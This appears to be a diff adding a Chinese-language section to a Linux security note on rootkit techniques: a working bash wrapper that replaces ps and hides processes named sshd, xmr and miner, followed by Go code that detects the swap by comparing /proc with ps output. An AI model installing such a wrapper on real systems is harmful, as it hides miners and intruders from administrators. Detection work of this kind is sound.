@@ -71,3 +71,186 @@ func checkLDPreloadConfig() (bool, []string) {
 }
 
 ```
+
+
+
+
+替换关键系统工具和二进制文件：通过替换常用的系统命令如 ls, ps, netstat 等，使得这些命令在被执行时隐藏特定的信息，例如隐藏特定的文件、进程或网络连接。 这个是一个bash 包装的ps 命令， 可以过滤掉指定进程， 只要把原ps 重命令ps1（可以是其他的字符，只要一致就行）即可。
+
+```bash
+
+#!/bin/bash
+
+# Default list of processes to exclude (you can add more process names here)
+EXCLUDE_PROCESSES=("sshd" "xmr" "miner")
+
+# Parse options and arguments
+PS_ARGS=()
+EXCLUDE_FLAG=true
+
+while [[ $# -gt 0 ]]; do
+    case $1 in
+        --exclude)
+            EXCLUDE_FLAG=true
+            shift # Skip the --exclude argument
+            ;;
+        *)
+            PS_ARGS+=("$1") # Collect all other arguments
+            shift
+            ;;
+    esac
+done
+
+# If no arguments are passed, default to 'aux'
+if [ ${#PS_ARGS[@]} -eq 0 ]; then
+    PS_ARGS=("aux")
+fi
+
+# Execute the ps command and pipe its output to grep
+ps1 "${PS_ARGS[@]}" | {
+    if [ "$EXCLUDE_FLAG" = true ]; then
+        # Build the grep exclusion pattern
+        exclude_pattern=$(printf "|%s" "${EXCLUDE_PROCESSES[@]}")
+        exclude_pattern=${exclude_pattern:1} # Remove the leading '|'
+
+        # Use grep to exclude specific process names
+        grep -vE "$exclude_pattern"
+    else
+        # Directly output the ps result
+        cat
+    fi
+}
+```
+
+
+检测 ps 命令有没有被替换, 遍历proc 和 ps 执行结果对比， 代码如下 ：
+
+
+```bash
+
+func getProcProcesses(minAge time.Duration) (*ProcessMap, error) {
+	procMap := NewProcessMap()
+	files, err := ioutil.ReadDir("/proc")
+	if err != nil {
+		return nil, fmt.Errorf("error reading /proc: %v", err)
+	}
+
+	now := time.Now().Unix()
+
+	for _, f := range files {
+		if !f.IsDir() {
+			continue
+		}
+
+		pid, err := strconv.Atoi(f.Name())
+		if err != nil {
+			continue
+		}
+
+		startTime, err := getProcessStartTime(pid)
+		if err != nil {
+			continue
+		}
+
+		// Skip processes running for less than minAge
+		if now-startTime < int64(minAge.Seconds()) {
+			continue
+		}
+
+		statusFile := filepath.Join("/proc", f.Name(), "status")
+		content, err := ioutil.ReadFile(statusFile)
+		if err != nil {
+			continue
+		}
+
+		info := &ProcessInfo{
+			PID:       pid,
+			StartTime: startTime,
+			CmdLine:   getCmdLine(pid),
+		}
+
+		lines := strings.Split(string(content), "\n")
+		for _, line := range lines {
+			switch {
+			case strings.HasPrefix(line, "Name:"):
+				info.Name = strings.TrimSpace(strings.TrimPrefix(line, "Name:"))
+			case strings.HasPrefix(line, "PPid:"):
+				info.PPID, _ = strconv.Atoi(strings.TrimSpace(strings.TrimPrefix(line, "PPid:")))
+			case strings.HasPrefix(line, "Uid:"):
+				uidFields := strings.Fields(strings.TrimPrefix(line, "Uid:"))
+				if len(uidFields) > 0 {
+					info.UID, _ = strconv.Atoi(uidFields[0])
+				}
+			case strings.HasPrefix(line, "State:"):
+				stateParts := strings.Fields(strings.TrimPrefix(line, "State:"))
+				if len(stateParts) > 0 {
+					info.State = string(stateParts[0][0])
+				}
+			}
+		}
+
+		procMap.Add(pid, info)
+	}
+
+	return procMap, nil
+}
+
+// getPsProcesses retrieves process information from the ps command
+func getPsProcesses(minAge time.Duration) (*ProcessMap, error) {
+	procMap := NewProcessMap()
+
+	// Use ps command to get more detailed information, including start time
+	cmd := exec.Command("ps", "ax", "-o", "pid,ppid,uid,stat,lstart,comm")
+	output, err := cmd.Output()
+	if err != nil {
+		return nil, fmt.Errorf("error executing ps command: %v", err)
+	}
+
+	now := time.Now()
+	scanner := bufio.NewScanner(strings.NewReader(string(output)))
+	scanner.Scan() // Skip header line
+
+	for scanner.Scan() {
+		fields := strings.Fields(scanner.Text())
+		if len(fields) < 6 {
+			continue
+		}
+
+		pid, err := strconv.Atoi(fields[0])
+		if err != nil {
+			continue
+		}
+
+		// Parse start time
+		timeStr := strings.Join(fields[4:9], " ")
+		startTime, err := time.Parse("Mon Jan 2 15:04:05 2006", timeStr)
+		if err != nil {
+			continue
+		}
+
+		// Skip processes running for less than minAge
+		if now.Sub(startTime) < minAge {
+			continue
+		}
+
+		ppid, _ := strconv.Atoi(fields[1])
+		uid, _ := strconv.Atoi(fields[2])
+
+		info := &ProcessInfo{
+			PID:       pid,
+			PPID:      ppid,
+			UID:       uid,
+			State:     string(fields[3][0]),
+			StartTime: startTime.Unix(),
+			Name:      fields[len(fields)-1],
+			CmdLine:   getCmdLine(pid),
+		}
+
+		procMap.Add(pid, info)
+	}
+
+	return procMap, nil
+}
+
+
+```
